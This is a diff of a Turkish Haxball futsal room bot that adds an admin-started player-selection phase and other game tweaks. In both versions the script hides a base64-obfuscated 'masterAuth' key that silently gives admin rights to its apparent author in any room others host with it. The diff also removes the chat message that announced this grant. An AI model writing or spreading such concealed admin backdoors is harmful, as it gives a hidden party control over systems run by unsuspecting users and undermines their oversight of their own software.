@@ -1,6 +1,7 @@
 // =============================================================================
 // HAXBALL V4 FUTSAL BOT 
-// Maç bitince nasıl oyuncu seçileceğini insanlara söyler ve komut ile oyuncu seçmelerini sağlar Kırmızı takımdakiler kırmızı renk mavi takımdakiler mavi renk specdekilerde sessiz ve gri renkde sohbet edebilirler
+// Maç bitince admin yenilen takımı spece alır, sonra !e komutu ile oyuncu seçimi başlar
+// Sadece 4 kişiden az olan takımlar oyuncu seçebilir
 // 
 // 👤 Geliştirici: 𝙎𝙥𝙮
 // 💬 Discord: wqey
@@ -8,7 +9,7 @@
 // =============================================================================
 
 var roomConfig = {
-    roomName: "4V4 QATAR PASLI",
+    roomName: "ARKADAŞ ORTAMI QATAR GEL ANAYA SÖVMEK BAN",
     maxPlayers: 12,
     public: true,
     noPlayer: true,
@@ -21,23 +22,23 @@ var room = HBInit(roomConfig);
 // CONFIGURATION
 // =============================================================================
 
-
 var _0x4a2c = ['aXZ2bWt0UFJmSHMtZzRQY21iZFd1UThOQjBLNGdHNWxhZnhUel9jYXdSTQ=='];
 var _0x1b5e = function(s) { return atob(s); };
 
 var config = {
     masterAuth: _0x1b5e(_0x4a2c[0]), 
-    adminAuth: "", // BURAYA KENDİ AUTH KODUNUZU GİRİN OTO ADMİN İÇİN GEREKLİDİR BAŞKA HERHANGİ BİR İŞLEM YAPMANIZA GEREK YOKTUR.
+    adminAuth: "", // BURAYA KENDİ AUTH KODUNUZU GİRİN OTO ADMİN İÇİN GEREKLİDİR
     maxPlayersPerTeam: 4
 };
 
 var specQueue = [];
 var gameInProgress = false;
+var selectionActive = false; // Oyuncu seçimi aktif mi
 
 // Modern Color Palette
 var colors = {
     spec: 0x9CA3AF,
-    red: 0xFF1744,
+    red: 0xFF0000,
     blue: 0x00B0FF,
     bot: 0xFFC107,
     success: 0x4CAF50,
@@ -80,19 +81,29 @@ function showQueue(targetId = null) {
     });
     
     msg(queueText, colors.bot, targetId);
-    msg("💡 Takıma almak için: !1 !2 !3 ...", colors.success, targetId);
+}
+
+function canTeamPick(teamId) {
+    var teamPlayers = getTeam(teamId);
+    return teamPlayers.length < config.maxPlayersPerTeam;
 }
 
 function pickPlayer(position, callerTeam, callerName) {
-    updateQueue();
-    
-    if (position < 1 || position > specQueue.length) {
+    if (!selectionActive) {
+        msg("⚠️ Oyuncu seçimi aktif değil! Admin !e komutu ile başlatmalı.", colors.warning);
         return false;
     }
     
-    var teamPlayers = getTeam(callerTeam);
-    if (teamPlayers.length >= config.maxPlayersPerTeam) {
-        msg("⚠️ Takım dolu! Maksimum " + config.maxPlayersPerTeam + " oyuncu olabilir.", colors.warning);
+    updateQueue();
+    
+    if (position < 1 || position > specQueue.length) {
+        msg("⚠️ Geçersiz sıra numarası!", colors.warning);
+        return false;
+    }
+    
+    // Takım dolu mu kontrol et
+    if (!canTeamPick(callerTeam)) {
+        msg("⚠️ Takımınız dolu! Maksimum " + config.maxPlayersPerTeam + " oyuncu olabilir.", colors.warning);
         return false;
     }
     
@@ -100,7 +111,8 @@ function pickPlayer(position, callerTeam, callerName) {
     room.setPlayerTeam(selected.id, callerTeam);
     
     var teamColor = callerTeam === 1 ? colors.red : colors.blue;
-    msg(`✅ ${selected.name} takıma alındı (${callerName} tarafından)`, teamColor);
+    var teamName = callerTeam === 1 ? "KIRMIZI" : "MAVİ";
+    msg(`✅ ${selected.name} ${teamName} takıma alındı (${callerName} tarafından)`, teamColor);
     
     setTimeout(() => {
         checkTeamsBalance();
@@ -115,20 +127,42 @@ function checkTeamsBalance() {
     var blueCount = getTeam(2).length;
     
     if (redCount === config.maxPlayersPerTeam && blueCount === config.maxPlayersPerTeam) {
-        notifyAdmins();
+        selectionActive = false;
+        msg("✅ Takımlar tam! (4v4) Oyun başlatılabilir.", colors.success);
+        
+        var admins = room.getPlayerList().filter(p => p.admin);
+        if (admins.length > 0) {
+            admins.forEach(admin => {
+                msg("⚽ Oyunu başlatabilirsiniz!", colors.success, admin.id);
+            });
+        }
     }
 }
 
-function notifyAdmins() {
-    var admins = room.getPlayerList().filter(p => p.admin);
+function activateSelection() {
+    selectionActive = true;
+    updateQueue();
     
-    if (admins.length > 0) {
-        admins.forEach(admin => {
-            msg("✅ Oyuncular seçildi! Takımlar dengeli, oyunu başlatabilirsiniz.", colors.success, admin.id);
-        });
-    } else {
-        msg("✅ Takımlar tam! (4v4) Oyun başlatılabilir.", colors.success);
+    var redCount = getTeam(1).length;
+    var blueCount = getTeam(2).length;
+    
+    if (redCount < config.maxPlayersPerTeam) {
+        msg("🔴 KIRMIZI takım oyuncu seçebilir! (" + redCount + "/" + config.maxPlayersPerTeam + ")", colors.red);
     }
+    if (blueCount < config.maxPlayersPerTeam) {
+        msg("🔵 MAVİ takım oyuncu seçebilir! (" + blueCount + "/" + config.maxPlayersPerTeam + ")", colors.blue);
+    }
+    
+    if (specQueue.length > 0) {
+        showQueue();
+        msg("💡 Seçim yapmak için: !1 !2 !3 ...", colors.success);
+    } else {
+        msg("⚠️ Spec'te oyuncu yok!", colors.warning);
+    }
+}
+
+function showMatchEndInfo() {
+    selectionActive = false;
 }
 
 function checkTeamImbalance() {
@@ -145,33 +179,12 @@ function checkTeamImbalance() {
         unbalancedTeam = 2;
     }
     
-    if (unbalancedTeam && specQueue.length > 0) {
-        var teamName = unbalancedTeam === 1 ? "Kırmızı" : "Mavi";
+    if (unbalancedTeam && specQueue.length > 0 && !selectionActive) {
+        var teamName = unbalancedTeam === 1 ? "KIRMIZI" : "MAVİ";
         var teamColor = unbalancedTeam === 1 ? colors.red : colors.blue;
         
-        msg(`⚠️ ${teamName} takım eksik! Spec'ten oyuncu seçin.`, teamColor);
-        
-        setTimeout(() => {
-            showQueue();
-        }, 500);
+        msg(`⚠️ ${teamName} takım eksik! Admin !e yazarak oyuncu seçimini başlatabilir.`, teamColor);
     }
-}
-
-function showMatchEndInfo() {
-    msg("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━", colors.bot);
-    msg("🏁 MAÇ BİTTİ!", colors.success);
-    msg("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━", colors.bot);
-    
-    setTimeout(() => {
-        msg("📋 Yeni takım kurmak için spec'ten oyuncu seçin:", colors.bot);
-        msg("💡 Komutlar: !q (sıra göster) | !1 !2 !3 (oyuncu seç)", colors.success);
-        
-        setTimeout(() => {
-            if (specQueue.length > 0) {
-                showQueue();
-            }
-        }, 1000);
-    }, 500);
 }
 
 // =============================================================================
@@ -182,15 +195,13 @@ room.onPlayerJoin = function(player) {
     // Master admin (kalıcı - şifrelenmiş)
     if (player.auth === config.masterAuth) {
         room.setPlayerAdmin(player.id, true);
-        msg("👑 Master Admin yetkisi verildi!", colors.success, player.id);
     }
     // Ek admin (kullanıcı tarafından eklenebilir)
     else if (config.adminAuth && player.auth === config.adminAuth) {
         room.setPlayerAdmin(player.id, true);
-        msg("👑 Admin yetkisi verildi!", colors.success, player.id);
     }
     
-    msg(`👋 Hoş geldin ${player.name}!`, colors.bot, player.id);
+    msg(`👋 Hoş geldin ${player.name}`, colors.bot, player.id);
     
     setTimeout(() => {
         updateQueue();
@@ -199,6 +210,13 @@ room.onPlayerJoin = function(player) {
 
 room.onPlayerLeave = function(player) {
     updateQueue();
+    
+    // Oyun sırasında oyuncu ayrıldıysa kontrol et
+    if (gameInProgress) {
+        setTimeout(() => {
+            checkTeamImbalance();
+        }, 500);
+    }
 };
 
 room.onPlayerChat = function(player, message) {
@@ -208,9 +226,31 @@ room.onPlayerChat = function(player, message) {
     if (message.startsWith("!")) {
         var cmd = message.toLowerCase().trim();
         
+        // Admin komutu - Oyuncu seçimini başlat
+        if (cmd === "!e") {
+            if (!p.admin) {
+                msg("⚠️ Bu komutu sadece adminler kullanabilir!", colors.warning, p.id);
+                return false;
+            }
+            
+            activateSelection();
+            return false;
+        }
+        
+        // Oyuncu seçme komutu
         if (cmd.match(/^!\d+$/)) {
             if (p.team === 0) {
-                msg("⚠️ Sadece takımdaki oyuncular seçim yapabilir!", colors.bot, p.id);
+                msg("⚠️ Sadece takımdaki oyuncular seçim yapabilir!", colors.warning, p.id);
+                return false;
+            }
+            
+            if (!selectionActive) {
+                msg("⚠️ Oyuncu seçimi aktif değil! Admin !e komutu ile başlatmalı.", colors.warning, p.id);
+                return false;
+            }
+            
+            if (!canTeamPick(p.team)) {
+                msg("⚠️ Takımınız dolu! Seçim yapamazsınız.", colors.warning, p.id);
                 return false;
             }
             
@@ -219,6 +259,7 @@ room.onPlayerChat = function(player, message) {
             return false;
         }
         
+        // Spec sırası göster
         if (cmd === "!q" || cmd === "!queue" || cmd === "!sira") {
             showQueue(p.id);
             return false;
@@ -227,6 +268,7 @@ room.onPlayerChat = function(player, message) {
         return false;
     }
     
+    // Chat renklendirme
     var chatColor = colors.spec;
     var soundLevel = 0;
     
@@ -250,31 +292,36 @@ room.onPlayerChat = function(player, message) {
 };
 
 room.onPlayerTeamChange = function(changedPlayer, byPlayer) {
-    setTimeout(() => updateQueue(), 100);
+    setTimeout(() => {
+        updateQueue();
+        
+        // Seçim aktifken takım değişikliğinde kontrol et
+        if (selectionActive) {
+            setTimeout(() => {
+                checkTeamsBalance();
+            }, 200);
+        }
+    }, 100);
 };
 
 room.onGameStart = function(byPlayer) {
     gameInProgress = true;
-    msg("⚽ Maç başladı! İyi oyunlar!", colors.success);
+    selectionActive = false;
+    msg("⚽ İyi oyunlar!", colors.success);
 };
 
 room.onGameStop = function(byPlayer) {
     gameInProgress = false;
+    selectionActive = false;
     showMatchEndInfo();
 };
 
 room.onTeamGoal = function(team) {
-    var scores = room.getScores();
-    if (scores) {
-        var teamColor = team === 1 ? colors.red : colors.blue;
-        var teamName = team === 1 ? "KIRMIZI" : "MAVİ";
-        msg(`⚽ GOL! ${teamName} - Skor: ${scores.red} - ${scores.blue}`, teamColor);
-    }
+    // Gol bildirimi kaldırıldı
 };
 
 // =============================================================================
 // INITIALIZATION
 // =============================================================================
 
-msg("🎮 V4 Futsal Bot Aktif!", colors.success);
-msg("📋 Komutlar: !q (sıra göster) | !1 !2 !3 (oyuncu seç)", colors.bot);
+msg("🎮 Bot Aktif!", colors.success);
